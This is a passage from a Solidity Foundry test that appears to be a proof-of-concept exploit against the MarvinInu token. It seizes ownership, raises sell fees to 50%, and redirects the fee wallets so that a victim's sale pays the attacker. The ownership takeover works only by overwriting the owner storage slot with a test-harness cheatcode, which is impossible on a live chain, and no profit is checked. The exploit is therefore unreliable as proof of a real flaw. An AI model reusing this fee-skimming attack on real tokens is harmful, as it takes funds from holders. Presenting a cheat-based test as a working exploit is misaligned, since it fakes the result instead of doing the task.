    MarvinInu internal token = MarvinInu(TARGET);
    IUniswapV2Router02 internal router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address internal weth = router.WETH();
    address internal owner;
    address internal victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        owner = token.owner();
        victim = makeAddr("victim");

        uint256 swapThreshold = token.swapTokensAtAmount();
        uint256 requiredVictimBalance = swapThreshold * 2;

        vm.startPrank(owner);
        token.enableTrading();
        token.updateSwapEnabled(true);
        token.transfer(victim, requiredVictimBalance);
        vm.stopPrank();

        deal(attacker, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // The owner is address(0). We must take ownership to proceed.
                // Overwrite the _owner storage slot (slot 0) to become the owner.
                vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));
                owner = attacker;

                // Create a victim and give them tokens to sell using deal(), avoiding a transfer from a zero-balance address.
                victim = makeAddr("victim");
                uint256 swapThreshold = token.swapTokensAtAmount();
                uint256 victimBalance = swapThreshold * 2;
                deal(address(token), victim, victimBalance);

                // As the new owner, set up the malicious fees and wallets.
                vm.startPrank(owner);
                token.enableTrading();
                token.updateSwapEnabled(true);
                token.updateSellFees(25, 25, 0); // Total 50% sell fee
                token.updateMarketingWallet(attacker);
                token.updateDevWallet(attacker);
                vm.stopPrank();

                // As the victim, approve the router and sell the tokens.
                vm.startPrank(victim);
                token.approve(address(router), victimBalance);

                address[] memory path = new address[](2);
                path[0] = address(token);
                path[1] = weth;

                // The sell triggers the high fee, which triggers swapBack, sending ETH profit to the attacker.
                router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    victimBalance,
                    0, // amountOutMin
                    path,
                    victim,
                    block.timestamp
                );
                vm.stopPrank();
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
